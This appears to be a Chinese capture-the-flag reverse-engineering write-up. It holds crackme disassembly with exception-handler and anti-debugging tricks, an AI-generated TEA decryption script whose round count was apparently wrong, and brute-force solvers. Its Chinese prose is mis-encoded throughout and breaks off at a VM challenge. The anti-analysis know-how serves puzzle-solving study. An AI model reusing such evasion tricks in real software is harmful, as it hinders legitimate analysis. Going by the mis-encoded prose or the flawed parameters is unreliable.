Stack[00003AC4]:0019FE9B db  31h ; 1
Stack[00003AC4]:0019FE9C db 0CCh
Stack[00003AC4]:0019FE9D db 0CCh
Stack[00003AC4]:0019FE9E db 0CCh
Stack[00003AC4]:0019FE9F db 0CCh
Stack[00003AC4]:0019FEA0 db 0CCh
Stack[00003AC4]:0019FEA1 db 0CCh
Stack[00003AC4]:0019FEA2 db 0CCh
Stack[00003AC4]:0019FEA3 db 0CCh
Stack[00003AC4]:0019FEA4 db  31h ; 1
Stack[00003AC4]:0019FEA5 db  31h ; 1
Stack[00003AC4]:0019FEA6 db  31h ; 1
Stack[00003AC4]:0019FEA7 db  31h ; 1
Stack[00003AC4]:0019FEA8 db  31h ; 1
Stack[00003AC4]:0019FEA9 db  31h ; 1
Stack[00003AC4]:0019FEAA db  31h ; 1
Stack[00003AC4]:0019FEAB db  31h ; 1
Stack[00003AC4]:0019FEAC db  31h ; 1
Stack[00003AC4]:0019FEAD db  31h ; 1
Stack[00003AC4]:0019FEAE db  31h ; 1
Stack[00003AC4]:0019FEAF db  31h ; 1
Stack[00003AC4]:0019FEB0 db  31h ; 1
Stack[00003AC4]:0019FEB1 db  31h ; 1
Stack[00003AC4]:0019FEB2 db  31h ; 1
Stack[00003AC4]:0019FEB3 db  31h ; 1
Stack[00003AC4]:0019FEB4 db  31h ; 1
Stack[00003AC4]:0019FEB5 db  31h ; 1
Stack[00003AC4]:0019FEB6 db  31h ; 1
Stack[00003AC4]:0019FEB7 db  31h ; 1
Stack[00003AC4]:0019FEB8 db  31h ; 1
Stack[00003AC4]:0019FEB9 db  31h ; 1
Stack[00003AC4]:0019FEBA db  31h ; 1
Stack[00003AC4]:0019FEBB db  31h ; 1
Stack[00003AC4]:0019FEBC db  31h ; 1
Stack[00003AC4]:0019FEBD db  31h ; 1
Stack[00003AC4]:0019FEBE db  31h ; 1
Stack[00003AC4]:0019FEBF db  31h ; 1
Stack[00003AC4]:0019FEC0 db  31h ; 1
Stack[00003AC4]:0019FEC1 db  31h ; 1
Stack[00003AC4]:0019FEC2 db  31h ; 1
Stack[00003AC4]:0019FEC3 db  31h ; 1
Stack[00003AC4]:0019FEC4 db    0
Stack[00003AC4]:0019FEC5 db 0CCh
Stack[00003AC4]:0019FEC6 db 0CCh
Stack[00003AC4]:0019FEC7 db 0CCh
Stack[00003AC4]:0019FEC8 db 0CCh
Stack[00003AC4]:0019FEC9 db 0CCh
Stack[00003AC4]:0019FECA db 0CCh
Stack[00003AC4]:0019FECB db 0CCh
Stack[00003AC4]:0019FECC db 0CCh
Stack[00003AC4]:0019FECD db 0CCh
Stack[00003AC4]:0019FECE db 0CCh
Stack[00003AC4]:0019FECF db 0CCh
Stack[00003AC4]:0019FED0 db    1
Stack[00003AC4]:0019FED1 db    0
Stack[00003AC4]:0019FED2 db    0
Stack[00003AC4]:0019FED3 db    0
Stack[00003AC4]:0019FED4 db    2
Stack[00003AC4]:0019FED5 db    0
Stack[00003AC4]:0019FED6 db    0
Stack[00003AC4]:0019FED7 db    0
Stack[00003AC4]:0019FED8 db    3
Stack[00003AC4]:0019FED9 db    0
Stack[00003AC4]:0019FEDA db    0
Stack[00003AC4]:0019FEDB db    0
Stack[00003AC4]:0019FEDC db    4
Stack[00003AC4]:0019FEDD db    0
Stack[00003AC4]:0019FEDE db    0
Stack[00003AC4]:0019FEDF db    0
Stack[00003AC4]:0019FEE0 db 0CCh
Stack[00003AC4]:0019FEE1 db 0CCh
Stack[00003AC4]:0019FEE2 db 0CCh
Stack[00003AC4]:0019FEE3 db 0CCh
Stack[00003AC4]:0019FEE4 db 0DCh
Stack[00003AC4]:0019FEE5 db 0A9h
Stack[00003AC4]:0019FEE6 db 0ACh
Stack[00003AC4]:0019FEE7 db 0B0h
Stack[00003AC4]:0019FEE8 db    8
Stack[00003AC4]:0019FEE9 db 0FFh
Stack[00003AC4]:0019FEEA db  19h
Stack[00003AC4]:0019FEEB db    0
Stack[00003AC4]:0019FEEC db 0D3h
Stack[00003AC4]:0019FEED db  30h ; 0
Stack[00003AC4]:0019FEEE db  1Dh
Stack[00003AC4]:0019FEEF db    0
Stack[00003AC4]:0019FEF0 db    1
Stack[00003AC4]:0019FEF1 db    0
Stack[00003AC4]:0019FEF2 db    0
Stack[00003AC4]:0019FEF3 db    0
Stack[00003AC4]:0019FEF4 db  18h
Stack[00003AC4]:0019FEF5 db  75h ; u
Stack[00003AC4]:0019FEF6 db  5Eh ; ^
Stack[00003AC4]:0019FEF7 db    0
Stack[00003AC4]:0019FEF8 db 0C8h
Stack[00003AC4]:0019FEF9 db 0CBh
Stack[00003AC4]:0019FEFA db  5Eh ; ^
Stack[00003AC4]:0019FEFB db    0
Stack[00003AC4]:0019FEFC db    1
Stack[00003AC4]:0019FEFD db    0
Stack[00003AC4]:0019FEFE db    0
Stack[00003AC4]:0019FEFF db    0
Stack[00003AC4]:0019FF00 db  18h
Stack[00003AC4]:0019FF01 db  75h ; u
Stack[00003AC4]:0019FF02 db  5Eh ; ^
Stack[00003AC4]:0019FF03 db    0
Stack[00003AC4]:0019FF04 db 0C8h
Stack[00003AC4]:0019FF05 db 0CBh
Stack[00003AC4]:0019FF06 db  5Eh ; ^
Stack[00003AC4]:0019FF07 db    0
Stack[00003AC4]:0019FF08 db  64h ; d
Stack[00003AC4]:0019FF09 db 0FFh
Stack[00003AC4]:0019FF0A db  19h
Stack[00003AC4]:0019FF0B db    0
Stack[00003AC4]:0019FF0C db  1Ah
Stack[00003AC4]:0019FF0D db  2Fh ; /
Stack[00003AC4]:0019FF0E db  1Dh
Stack[00003AC4]:0019FF0F db    0
Stack[00003AC4]:0019FF10 db  50h ; P
Stack[00003AC4]:0019FF11 db 0A8h
Stack[00003AC4]:0019FF12 db 0ACh
Stack[00003AC4]:0019FF13 db 0B0h
Stack[00003AC4]:0019FF14 db  2Dh ; -
Stack[00003AC4]:0019FF15 db  10h
Stack[00003AC4]:0019FF16 db  1Dh
Stack[00003AC4]:0019FF17 db    0
Stack[00003AC4]:0019FF18 db  2Dh ; -
Stack[00003AC4]:0019FF19 db  10h
Stack[00003AC4]:0019FF1A db  1Dh
Stack[00003AC4]:0019FF1B db    0
Stack[00003AC4]:0019FF1C db    0
Stack[00003AC4]:0019FF1D db  60h ; `
Stack[00003AC4]:0019FF1E db  2Ch ; ,
Stack[00003AC4]:0019FF1F db    0
Stack[00003AC4]:0019FF20 db    0

è¿˜éœ€è¦ä»€ä¹ˆå†…å®¹å—
```

A:

```
åŸºäºæ‚¨æä¾›çš„è°ƒè¯•ä¿¡æ¯ï¼Œæˆ‘ç°åœ¨å¯ä»¥ç¼–å†™è§£å¯†è„šæœ¬äº†ã€‚æ ¹æ®åˆ†æï¼Œè¿™æ˜¯ä¸€ä¸ªåŸºäºTEAï¼ˆTiny Encryption Algorithmï¼‰å˜ç§çš„åŠ å¯†ç®—æ³•ã€‚

ä»¥ä¸‹æ˜¯å®Œæ•´çš„è§£å¯†è„šæœ¬ï¼š

python
import struct

def tea_decrypt(v, k, rounds=31, delta=0x9000000):
    """
    TEAè§£å¯†å‡½æ•°
    v: åŒ…å«ä¸¤ä¸ª32ä½æ•´æ•°çš„åˆ—è¡¨ [v0, v1]
    k: åŒ…å«å››ä¸ª32ä½æ•´æ•°çš„å¯†é’¥ [k0, k1, k2, k3]
    rounds: è½®æ•°
    delta: é­”æ•°
    """
    v0, v1 = v[0], v[1]
    sum_val = (delta * rounds) & 0xFFFFFFFF
    
    for i in range(rounds):
        v1 = (v1 - (((v0 << 4) + k[2]) ^ (v0 + sum_val) ^ ((v0 >> 5) + k[3]))) & 0xFFFFFFFF
        v0 = (v0 - (((v1 << 4) + k[0]) ^ (v1 + sum_val) ^ ((v1 >> 5) + k[1]))) & 0xFFFFFFFF
        sum_val = (sum_val - delta) & 0xFFFFFFFF
    
    return [v0, v1]

def main():
    # ä»è°ƒè¯•ä¿¡æ¯ä¸­è·å–çš„å‚æ•°
    delta = 0x9000000
    rounds = 31
    
    # å¯†é’¥ (ä»var_18åˆå§‹å€¼ [1,2,3,4])
    key = [1, 2, 3, 4]
    
    # å¯†æ–‡å— (ä»ä¸»å‡½æ•°çš„æ¯”è¾ƒå€¼)
    cipher_blocks = [
        [0x9A8C0C4B, 0xC412FF1C],  # ç¬¬ä¸€ä¸ª8å­—èŠ‚å—
        [0xBFC3A488, 0xB16C8FD0],  # ç¬¬äºŒä¸ª8å­—èŠ‚å—
        [0x4136E319, 0x8835E4FF],  # ç¬¬ä¸‰ä¸ª8å­—èŠ‚å—
        [0x118263A7, 0x7C85D629]   # ç¬¬å››ä¸ª8å­—èŠ‚å—
    ]
    
    # è§£å¯†æ‰€æœ‰å—
    plain_blocks = []
    for block in cipher_blocks:
        decrypted = tea_decrypt(block, key, rounds, delta)
        plain_blocks.extend(decrypted)
    
    # å°†è§£å¯†åçš„32ä½æ•´æ•°è½¬æ¢ä¸ºå­—èŠ‚
    flag_bytes = b''
    for word in plain_blocks:
        flag_bytes += struct.pack('<I', word)  # å°ç«¯åº
    
    # è¾“å‡ºflag
    print("è§£å¯†åçš„Flag:", flag_bytes)
    
    # å°è¯•ä»¥ASCIIæ˜¾ç¤º
    try:
        flag_str = flag_bytes.decode('ascii')
        print("Flag (ASCII):", flag_str)
    except:
        print("åŒ…å«éASCIIå­—ç¬¦ï¼ŒåŸå§‹å­—èŠ‚:", flag_bytes.hex())

if __name__ == "__main__":
    main()
è¿™ä¸ªè„šæœ¬åŸºäºä»¥ä¸‹åˆ†æï¼š

åŠ å¯†ç®—æ³•ï¼šTEAå˜ç§ï¼Œä½¿ç”¨31è½®åŠ å¯†

Deltaå€¼ï¼š0x9000000ï¼ˆä»dword_1DB198è·å–ï¼‰

å¯†é’¥ï¼š[1, 2, 3, 4]ï¼ˆä»var_18åˆå§‹å€¼ï¼‰

å¯†æ–‡ï¼š4ä¸ª8å­—èŠ‚å—ï¼Œæ¯ä¸ªåŒ…å«ä¸¤ä¸ª32ä½æ•´æ•°

è§£å¯†è¿‡ç¨‹ï¼šé€†å‘TEAåŠ å¯†æ“ä½œ

è¿è¡Œæ­¤è„šæœ¬åº”è¯¥èƒ½è§£å¯†å‡ºåŸå§‹è¾“å…¥å­—ç¬¦ä¸²ï¼ˆflagï¼‰ã€‚å¦‚æœè¾“å‡ºåŒ…å«éASCIIå­—ç¬¦ï¼Œå¯èƒ½éœ€è¦è¿›ä¸€æ­¥åˆ†æè§£å¯†ç»“æœçš„å«ä¹‰ã€‚

æ‚¨å¯ä»¥ç›´æ¥è¿è¡Œè¿™ä¸ªè„šæœ¬æ¥è·å–flagã€‚å¦‚æœç»“æœä¸æ­£ç¡®ï¼Œè¯·å‘Šè¯‰æˆ‘ï¼Œæˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥è°ƒæ•´å‚æ•°ã€‚
```

çœ‹äº†ä¸€çœ¼æ”¹è½®æ•°ä¸º32è¿‡äº†

# GeekBinder





# Her

æç¤ºè¯

```
int sub_4224A0()
{
  unsigned int v0; // eax
  char v2; // [esp+0h] [ebp-F0h]
  char v3; // [esp+0h] [ebp-F0h]
  char v4; // [esp+0h] [ebp-F0h]
  char v5; // [esp+0h] [ebp-F0h]
  size_t i; // [esp+D0h] [ebp-20h]
  int v7; // [esp+DCh] [ebp-14h]
  size_t v8; // [esp+E8h] [ebp-8h]

  sub_42123A(&unk_42D0A4);
  v0 = sub_422760(0);
  srand(v0);
  sub_421177();
  sub_421087("Enter the flag: ", v2);
  sub_421023("%127s", (char)Str);
  v8 = strlen(Str);
  if ( v8 == dword_42B020 )
  {
    sub_4211B3();
    sub_421087("\nVerifying encrypted flag...\n", v3);
    v7 = 1;
    for ( i = 0; i < v8; ++i )
    {
      if ( byte_42B260[i] != byte_42B000[i] )
        v7 = 0;
    }
    if ( v7 )
    {
      sub_421087("\n", v4);
      sub_421087("YES!YES!", v5);
    }
    else
    {
      sub_421087("\nWrong\n", v4);
    }
    return 0;
  }
  else
  {
    sub_421087("\nWrong\n", v3);
    return 1;
  }
}

// attributes: thunk
size_t sub_4211B3(void)
{
  return sub_421D30();
}

.text:00421D30 sub_421D30      proc near               ; CODE XREF: sub_4211B3â†‘j
.text:00421D30
.text:00421D30 var_108         = dword ptr -108h
.text:00421D30 var_100         = dword ptr -100h
.text:00421D30 var_F8          = dword ptr -0F8h
.text:00421D30 var_24          = byte ptr -24h
.text:00421D30 var_20          = dword ptr -20h
.text:00421D30 var_14          = dword ptr -14h
.text:00421D30 var_8           = dword ptr -8
.text:00421D30
.text:00421D30                 push    ebp
.text:00421D31                 mov     ebp, esp
.text:00421D33                 sub     esp, 0E4h
.text:00421D39                 push    ebx
.text:00421D3A                 push    esi
.text:00421D3B                 push    edi
.text:00421D3C                 lea     edi, [ebp+var_24]
.text:00421D3F                 mov     ecx, 9
.text:00421D44                 mov     eax, 0CCCCCCCCh
.text:00421D49                 rep stosd
.text:00421D4B                 push    offset Str      ; Str
.text:00421D50                 call    strlen
.text:00421D55                 add     esp, 4
.text:00421D58                 mov     [ebp+var_8], eax
.text:00421D5B                 call    sub_4210CD
.text:00421D60                 test    eax, eax
.text:00421D62                 jz      short loc_421DAB
.text:00421D64                 mov     [ebp+var_14], 0
.text:00421D6B                 jmp     short loc_421D76
.text:00421D6D ; ---------------------------------------------------------------------------
.text:00421D6D
.text:00421D6D loc_421D6D:                             ; CODE XREF: sub_421D30+74â†“j
.text:00421D6D                 mov     eax, [ebp+var_14]
.text:00421D70                 add     eax, 1
.text:00421D73                 mov     [ebp+var_14], eax
.text:00421D76
.text:00421D76 loc_421D76:                             ; CODE XREF: sub_421D30+3Bâ†‘j
.text:00421D76                 mov     eax, [ebp+var_14]
.text:00421D79                 cmp     eax, [ebp+var_8]
.text:00421D7C                 jnb     short loc_421DA6
.text:00421D7E                 mov     esi, esp
.text:00421D80                 call    ds:__imp_rand
.text:00421D86                 cmp     esi, esp
.text:00421D88                 call    sub_421177
.text:00421D8D                 and     eax, 800000FFh
.text:00421D92                 jns     short loc_421D9B
.text:00421D94                 dec     eax
.text:00421D95                 or      eax, 0FFFFFF00h
.text:00421D9A                 inc     eax
.text:00421D9B
.text:00421D9B loc_421D9B:                             ; CODE XREF: sub_421D30+62â†‘j
.text:00421D9B                 mov     ecx, [ebp+var_14]
.text:00421D9E                 mov     byte_42B260[ecx], al
.text:00421DA4                 jmp     short loc_421D6D
.text:00421DA6 ; ---------------------------------------------------------------------------
.text:00421DA6
.text:00421DA6 loc_421DA6:                             ; CODE XREF: sub_421D30+4Câ†‘j
.text:00421DA6                 jmp     loc_421E3E
.text:00421DAB ; ---------------------------------------------------------------------------
.text:00421DAB
.text:00421DAB loc_421DAB:                             ; CODE XREF: sub_421D30+32â†‘j
.text:00421DAB                 mov     [ebp+var_20], 0
.text:00421DB2                 jmp     short loc_421DBD
.text:00421DB4 ; ---------------------------------------------------------------------------
.text:00421DB4
.text:00421DB4 loc_421DB4:                             ; CODE XREF: sub_421D30+109â†“j
.text:00421DB4                 mov     eax, [ebp+var_20]
.text:00421DB7                 add     eax, 1
.text:00421DBA                 mov     [ebp+var_20], eax
.text:00421DBD
.text:00421DBD loc_421DBD:                             ; CODE XREF: sub_421D30+82â†‘j
.text:00421DBD                 mov     eax, [ebp+var_20]
.text:00421DC0                 cmp     eax, [ebp+var_8]
.text:00421DC3                 jnb     short loc_421E3E
.text:00421DC5                 mov     eax, [ebp+var_20]
.text:00421DC8                 mov     dword_42B1DC, eax
.text:00421DCD                 push    offset sub_421181
.text:00421DD2                 push    large dword ptr fs:0
.text:00421DD9                 mov     large fs:0, esp
.text:00421DE0                 push    offset sub_421186
.text:00421DE5                 push    large dword ptr fs:0
.text:00421DEC                 mov     large fs:0, esp
.text:00421DF3                 push    offset sub_421091
.text:00421DF8                 push    large dword ptr fs:0
.text:00421DFF                 mov     large fs:0, esp
.text:00421E06                 ud2
.text:00421E08 ; ---------------------------------------------------------------------------
.text:00421E08                 xor     ecx, ecx
.text:00421E0A                 mov     eax, 1
.text:00421E0F                 div     ecx
.text:00421E11                 xor     eax, eax
.text:00421E13                 mov     al, [eax]
.text:00421E15                 mov     eax, [esp+108h+var_108]
.text:00421E18                 mov     large fs:0, eax
.text:00421E1E                 add     esp, 8
.text:00421E21                 mov     eax, [esp+100h+var_100]
.text:00421E24                 mov     large fs:0, eax
.text:00421E2A                 add     esp, 8
.text:00421E2D                 mov     eax, [esp+0F8h+var_F8]
.text:00421E30                 mov     large fs:0, eax
.text:00421E36                 add     esp, 8
.text:00421E39                 jmp     loc_421DB4
.text:00421E3E ; ---------------------------------------------------------------------------
.text:00421E3E
.text:00421E3E loc_421E3E:                             ; CODE XREF: sub_421D30:loc_421DA6â†‘j
.text:00421E3E                                         ; sub_421D30+93â†‘j
.text:00421E3E                 pop     edi
.text:00421E3F                 pop     esi
.text:00421E40                 pop     ebx
.text:00421E41                 add     esp, 0E4h
.text:00421E47                 cmp     ebp, esp
.text:00421E49                 call    sub_421177
.text:00421E4E                 mov     esp, ebp
.text:00421E50                 pop     ebp
.text:00421E51                 retn
.text:00421E51 sub_421D30      endp

// attributes: thunk
int __cdecl sub_421181(_DWORD *a1, int a2, int a3)
{
  return sub_422190(a1, a2, a3);
}

int __cdecl sub_422190(_DWORD *a1, int a2, int a3)
{
  char v3; // bl
  int v5; // [esp+E8h] [ebp-8h]

  sub_42123A(&unk_42D0A4);
  if ( *a1 != -1073741819 )
    return 1;
  v5 = dword_42B1DC;
  if ( dword_42B1DC >= strlen(Str) )
    return 1;
  ++dword_42B1D8;
  if ( (unsigned int)sub_4210CD() )
  {
    rand();
    v3 = sub_421177();
    byte_42B260[dword_42B1D8 % strlen(Str)] = v3;
  }
  else
  {
    byte_42B260[v5] = ((int)(unsigned __int8)byte_42B2E0[v5] >> 5) | (8 * byte_42B2E0[v5]);
    *(_DWORD *)(a3 + 184) += 2;
    ++dword_42B360;
  }
  return 0;
}

// attributes: thunk
int __cdecl sub_421186(_DWORD *a1, int a2, int a3)
{
  return sub_422010(a1, a2, a3);
}

int __cdecl sub_422010(_DWORD *a1, int a2, int a3)
{
  char v3; // bl

  if ( *a1 != -1073741676 || dword_42B1DC >= strlen(Str) )
    return 1;
  byte_42B2E0[dword_42B1DC] += ++dword_42B1D8 % 0x100u + dword_42B1DC * dword_42B1DC;
  if ( (unsigned int)sub_4210CD() )
  {
    rand();
    v3 = sub_421177();
    byte_42B260[dword_42B1D8 % strlen(Str)] = v3;
  }
  else
  {
    *(_DWORD *)(a3 + 184) += 2;
    ++dword_42B360;
  }
  return 0;
}

int __cdecl sub_421EA0(_DWORD *a1, int a2, int a3)
{
  char v3; // bl

  if ( *a1 != -1073741795 || dword_42B1DC >= strlen(Str) )
    return 1;
  byte_42B2E0[dword_42B1DC] = ++dword_42B1D8 ^ Str[dword_42B1DC] ^ 0xAA;
  if ( (unsigned int)sub_4210CD() )
  {
    rand();
    v3 = sub_421177();
    byte_42B260[dword_42B1D8 % strlen(Str)] = v3;
  }
  else
  {
    *(_DWORD *)(a3 + 184) += 2;
    ++dword_42B360;
  }
  return 0;
}

// attributes: thunk
__int64 sub_4210CD(void)
{
  return sub_421530();
}

__int64 sub_421530()
{
  __int64 v0; // rax
  int v1; // eax
  __int64 v3; // [esp-8h] [ebp-2D0h]
  int v4; // [esp+DCh] [ebp-1ECh]
  void (__stdcall *v5)(int); // [esp+E8h] [ebp-1E0h]
  void (*v6)(void); // [esp+F4h] [ebp-1D4h]
  _DWORD v7[3]; // [esp+100h] [ebp-1C8h] BYREF
  void (__stdcall *v8)(_DWORD *); // [esp+10Ch] [ebp-1BCh]
  void (__stdcall *v9)(int); // [esp+118h] [ebp-1B0h]
  void (*v10)(void); // [esp+124h] [ebp-1A4h]
  HMODULE hModule; // [esp+130h] [ebp-198h]
  int ii; // [esp+13Ch] [ebp-18Ch]
  int n; // [esp+148h] [ebp-180h]
  int m; // [esp+154h] [ebp-174h]
  int k; // [esp+160h] [ebp-168h]
  int j; // [esp+16Ch] [ebp-15Ch]
  int i; // [esp+178h] [ebp-150h]
  CHAR v18[20]; // [esp+184h] [ebp-144h] BYREF
  CHAR v19[24]; // [esp+198h] [ebp-130h] BYREF
  CHAR v20[28]; // [esp+1B0h] [ebp-118h] BYREF
  CHAR v21[40]; // [esp+1CCh] [ebp-FCh] BYREF
  CHAR ProcName[28]; // [esp+1F4h] [ebp-D4h] BYREF
  CHAR ModuleName[28]; // [esp+210h] [ebp-B8h] BYREF
  char v24; // [esp+22Ch] [ebp-9Ch]
  _BYTE v25[5]; // [esp+22Dh] [ebp-9Bh] BYREF
  _BYTE v26[8]; // [esp+23Ch] [ebp-8Ch]
  _BYTE v27[5]; // [esp+244h] [ebp-84h] BYREF
  _BYTE v28[11]; // [esp+254h] [ebp-74h]
  _BYTE v29[7]; // [esp+25Fh] [ebp-69h] BYREF
  _BYTE v30[20]; // [esp+270h] [ebp-58h]
  _BYTE v31[7]; // [esp+284h] [ebp-44h] BYREF
  _BYTE v32[11]; // [esp+294h] [ebp-34h]
  _BYTE v33[7]; // [esp+29Fh] [ebp-29h] BYREF
  _BYTE v34[20]; // [esp+2B0h] [ebp-18h] BYREF
  int savedregs; // [esp+2C8h] [ebp+0h] BYREF

  sub_42123A(&unk_42D0A4);
  qmemcpy(v34, ")'0,'.qpl&..B", 13);
  v32[0] = 11;
  v32[1] = 49;
  v32[2] = 6;
  v32[3] = 39;
  v32[4] = 32;
  v32[5] = 55;
  v32[6] = 37;
  v32[7] = 37;
  v32[8] = 39;
  v32[9] = 48;
  v32[10] = 18;
  qmemcpy(v33, "0'1',6B", sizeof(v33));
  v30[0] = 1;
  v30[1] = 42;
  v30[2] = 39;
  v30[3] = 33;
  v30[4] = 41;
  v30[5] = 16;
  v30[6] = 39;
  v30[7] = 47;
  v30[8] = 45;
  v30[9] = 54;
  v30[10] = 39;
  v30[11] = 6;
  v30[12] = 39;
  v30[13] = 32;
  v30[14] = 55;
  v30[15] = 37;
  v30[16] = 37;
  v30[17] = 39;
  v30[18] = 48;
  v30[19] = 18;
  qmemcpy(v31, "0'1',6B", sizeof(v31));
  v28[0] = 5;
  v28[1] = 39;
  v28[2] = 54;
  v28[3] = 1;
  v28[4] = 55;
  v28[5] = 48;
  v28[6] = 48;
  v28[7] = 39;
  v28[8] = 44;
  v28[9] = 54;
  v28[10] = 18;
  qmemcpy(v29, "0-!'11B", sizeof(v29));
  v26[0] = 5;
  v26[1] = 39;
  v26[2] = 54;
  v26[3] = 22;
  v26[4] = 43;
  v26[5] = 33;
  v26[6] = 41;
  v26[7] = 1;
  qmemcpy(v27, "-7,6B", sizeof(v27));
  v24 = 17;
  qmemcpy(v25, ".''2B", sizeof(v25));
  for ( i = 0; i < 13; ++i )
    ModuleName[i] = v34[i] ^ 0x42;
  for ( j = 0; j < 18; ++j )
    ProcName[j] = v32[j] ^ 0x42;
  for ( k = 0; k < 27; ++k )
    v21[k] = v30[k] ^ 0x42;
  for ( m = 0; m < 18; ++m )
    v20[m] = v28[m] ^ 0x42;
  for ( n = 0; n < 13; ++n )
    v19[n] = v26[n] ^ 0x42;
  for ( ii = 0; ii < 6; ++ii )
    v18[ii] = v25[ii - 1] ^ 0x42;
  GetModuleHandleA(ModuleName);
  hModule = (HMODULE)sub_421177();
  if ( hModule )
  {
    GetProcAddress(hModule, ProcName);
    v10 = (void (*)(void))sub_421177();
    if ( v10 && (v10(), sub_421177()) )
    {
      LODWORD(v0) = 1;
    }
    else
    {
      GetProcAddress(hModule, v21);
      v9 = (void (__stdcall *)(int))sub_421177();
      GetProcAddress(hModule, v20);
      v8 = (void (__stdcall *)(_DWORD *))sub_421177();
      if ( v9 )
      {
        if ( v8 )
        {
          v7[0] = 0;
          v8(v7);
          v1 = sub_421177();
          v9(v1);
          sub_421177();
          if ( !v7[0] )
            dword_42B1D8 ^= 0x1A373u;
        }
      }
      GetProcAddress(hModule, v19);
      v6 = (void (*)(void))sub_421177();
      GetProcAddress(hModule, v18);
      v5 = (void (__stdcall *)(int))sub_421177();
      LODWORD(v0) = v6
                 && v5
                 && (v6(), v4 = sub_421177(), v5(10), sub_421177(), v6(), (unsigned int)(sub_421177() - v4) > 0x32);
    }
  }
  else
  {
    LODWORD(v0) = 0;
  }
  v3 = v0;
  sub_421131((int)&savedregs, (int)&dword_421A9C);
  return v3;
}


```

è¯´å®è¯aiæ²¡å•¥ç”¨

ç»è¿‡å„ç§è¯¡å¼‚çš„åˆ†æï¼Œæ‰¾åˆ°è°ƒç”¨é¡ºåºæ˜¯ SEH1->SEH2->SEH3->SEH2->SEH3->SEH3

æ€ä¹ˆæ‰¾çš„å‘¢ã€‚ã€‚å…ˆçŒœæ˜¯è¿™æ ·çš„ï¼Œç„¶åè¯¢é—®äº†ä¸€ä¸‹å¾—çŸ¥å‰ä¸‰ä¸ªå­—ç¬¦ä¸€å®šæ˜¯SYCï¼Œç„¶ååŒæ„åŠ å¯†æŒ‰è¿™æ ·å»åŠ å¯†æ˜¯å¯¹çš„ï¼Œç„¶åå°±å¯ä»¥åŸºæœ¬ä¸¢aiäº†

æœ€ç»ˆè§£å¯†ä»£ç ï¼ˆcntçš„å˜åŒ–æ²¡å¼„æ˜ç™½çš„å»ºè®®è‡ªå·±å»çœ‹äº†ã€‚ã€‚å°±ä¸‰ä¸ªå¼‚å¸¸å’Œæ£€æµ‹è°ƒè¯•çŠ¶æ€é‡Œé¢æœ‰æ›´æ–°ï¼‰

```
def encrypt_char(c, i, cnt_in):
    """åŠ å¯†å•ä¸ªå­—ç¬¦ï¼ˆä¿®æ­£ç‰ˆï¼‰"""
    jm = ord(c)
    cnt = cnt_in

    # SEH1
    cnt += 1
    byte_40B2E0 = (cnt ^ jm ^ 0xAA) & 0xFF
    cnt ^= 0x1A373

    # SEH2 (ç¬¬1æ¬¡) - å…³é”®ä¿®æ­£ï¼šæ•´ä½“å–æ¨¡ï¼
    cnt += 1
    byte_40B2E0 = (byte_40B2E0 + (cnt % 0x100 + i * i)) & 0xFF
    cnt ^= 0x1A373

    # SEH3 (ç¬¬1æ¬¡)
    cnt += 1
    cnt ^= 0x1A373
    byte_40B260 = ((byte_40B2E0 >> 5) | (8 * byte_40B2E0)) & 0xFF

    # SEH2 (ç¬¬2æ¬¡) - å…³é”®ä¿®æ­£ï¼šæ•´ä½“å–æ¨¡ï¼
    cnt += 1
    byte_40B2E0 = (byte_40B2E0 + (cnt % 0x100 + i * i)) & 0xFF
    cnt ^= 0x1A373

    # SEH3 (ç¬¬2æ¬¡)
    cnt += 1
    cnt ^= 0x1A373
    byte_40B260 = ((byte_40B2E0 >> 5) | (8 * byte_40B2E0)) & 0xFF

    # SEH3 (ç¬¬3æ¬¡)
    cnt += 1
    cnt ^= 0x1A373
    byte_40B260 = ((byte_40B2E0 >> 5) | (8 * byte_40B2E0)) & 0xFF

    return byte_40B260, cnt


# éªŒè¯ä¿®æ­£åçš„ç»“æœ
print("ä¿®æ­£åéªŒè¯ï¼š")
print("ç¬¬0ä¸ªå­—ç¬¦ 'S':")
enc, cnt = encrypt_char('S', 0, 0x1A373)
print(f"  å¯†æ–‡: 0x{enc:02X}, cnt: {cnt}")

print("ç¬¬1ä¸ªå­—ç¬¦ 'Y':")
enc, cnt = encrypt_char('Y', 1, 107371)
print(f"  å¯†æ–‡: 0x{enc:02X}, cnt: {cnt}")

print("ç¬¬2ä¸ªå­—ç¬¦ 'C':")
enc, cnt = encrypt_char('C', 2, 107331)
print(f"  å¯†æ–‡: 0x{enc:02X}, cnt: {cnt}")


# è§£å¯†
def decrypt(cipher):
    plaintext = []
    cnt = 0x1A373

    for i, cipher_byte in enumerate(cipher):
        found = False
        for ascii_val in range(32, 127):
            enc, new_cnt = encrypt_char(chr(ascii_val), i, cnt)
            if enc == cipher_byte:
                plaintext.append(chr(ascii_val))
                cnt = new_cnt
                found = True
                break

        if not found:
            plaintext.append('?')
            # å¦‚æœæ‰¾ä¸åˆ°ï¼Œå°è¯•å…¨éƒ¨256ä¸ªå€¼
            for ascii_val in range(256):
                enc, new_cnt = encrypt_char(chr(ascii_val), i, cnt)
                if enc == cipher_byte:
                    plaintext[-1] = chr(ascii_val) if 32 <= ascii_val < 127 else f'\\x{ascii_val:02x}'
                    cnt = new_cnt
                    break

    return ''.join(plaintext)


cipher = [
    0x2D, 0x4F, 0x69, 0x3D, 0x5F, 0x01, 0xBD, 0x9F,
    0xA4, 0x6D, 0x89, 0xAE, 0x2A, 0xEA, 0xD1, 0x9C,
    0x71, 0x6D, 0xE1, 0x1E, 0x38, 0x7E, 0x8C, 0x0A,
    0xCE, 0x6B, 0xE0, 0xF7, 0x36, 0x72, 0x99
]

print("\n" + "=" * 50)
result = decrypt(cipher)
print(f"è§£å¯†ç»“æœ: {result}")
```



# ez vm

æˆ‘ä¹Ÿä¸çŸ¥é“å•Šæˆ‘å°±æŠŠæ•´ä¸ªç¨‹åºçš„ä»£ç ç»™å®ƒï¼Œå®ƒå°±è¯´æˆ‘å–œæ¬¢ä½ æˆ‘æŠŠè§£å¯†è„šæœ¬é€ç»™ä½ è¯·å’Œæˆ‘äº¤å¾€å§

æˆ‘æ¥åˆ†æè¿™é“VMï¼ˆé€†å‘é¢˜ã€‚è®©æˆ‘å…ˆç†è§£æ•´ä½“æ„ï¼Œç„¶åé€æ­¥åˆ†æã€‚

## åˆæ­¥åˆ†æ

ä»ä»£ç ç»“æ„çœ‹ï¼Œè¿™æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰è™šæ‹Ÿæœºçš„REé¢˜ã€‚è®©æˆ‘å…ˆç†è§£å‡ ä¸ªå…³é”®éƒ¨åˆ†ï¼š

